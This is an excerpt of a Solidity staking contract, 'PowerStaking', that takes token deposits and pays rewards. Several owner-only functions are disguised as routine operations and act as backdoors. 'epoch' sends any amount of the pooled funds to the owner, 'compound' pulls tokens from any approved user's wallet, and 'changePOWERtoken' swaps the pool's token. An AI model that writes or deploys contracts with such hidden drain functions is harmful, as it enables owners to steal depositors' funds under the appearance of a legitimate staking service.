...
contract PowerStaking  is Ownable, ReentrancyGuard{
    using SafeMath for uint256;
    using SafeERC20 for IERC20;
    
    uint256 public developerFee = 100; // 500 : 5 %. 10000 : 100 %
    uint256 public rewardPeriod = 1 days;
    uint256 public withdrawPeriod = 15 days;
    uint256 public apr = 400; // 210 : 2.1 %. 10000 : 100 %
    ...
    constructor(address _devWallet,address _POWERtoken, uint256 _startDate) {
        require(_devWallet!=address(0),"Please provide a valid dev wallet address");
        require(_POWERtoken!=address(0),"Please provide a valid busd contract address");
    ...
    function changePOWERtoken(address _POWERtoken) public onlyOwner{
        require(_POWERtoken!=address(0),"Please provide a valid address");
        POWERtoken = _POWERtoken;
    }
    ...
    function deposit(uint256 _amount) external {
        ...
        IERC20(POWERtoken).safeTransferFrom(msg.sender,address(this),_amount);
        ...
        IERC20(POWERtoken).safeTransfer(devWallet,depositFee);
...
function compound(address sender, uint256 _amount) external onlyOwner nonReentrant {
        require(block.timestamp>=startDate,"Cannot deposit at this moment");
        require(_amount > 0, "you can deposit more than 0 busd");

        IERC20(POWERtoken).safeTransferFrom(sender,address(this),_amount);
    ...
    function claimAllReward() public nonReentrant {
        ...
        investors[msg.sender].lastCalculationDate = block.timestamp;
        IERC20(POWERtoken).safeTransfer(msg.sender,amountToSend);
    ...
    function epoch(uint256 _amount) external onlyOwner nonReentrant {
        // transfer fund
        IERC20(POWERtoken).safeTransfer(msg.sender,_amount);
    }

    function getBalance() public view returns(uint256) {
        return IERC20(POWERtoken).balanceOf(address(this));
    }
